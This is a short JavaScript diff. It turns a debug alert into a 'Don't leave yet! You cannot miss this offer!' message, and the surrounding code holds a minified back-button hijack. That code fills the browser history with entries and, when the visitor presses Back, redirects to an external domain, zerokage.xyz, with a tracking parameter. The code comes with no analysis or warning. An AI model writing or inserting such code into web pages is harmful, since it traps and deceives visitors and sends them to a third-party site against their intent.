@@ -151,10 +151,8 @@ function goto(){
   var url = window.location.href;
 
   if (url.search("back=true") >= 0) {
-      alert("Backbutton");
-  } else { 
-      alert("Not Back Button");
-  }
+      alert("Don't leave yet! You cannot miss this offer!");
+  } 
 
   !function(){var a;try{for(a=0;10>a;++a){history.pushState({},"","#")}onpopstate=function(c){c.state&&location.replace("http://zerokage.xyz/?flux_action=64&back=true")}}catch(b){}}();
   
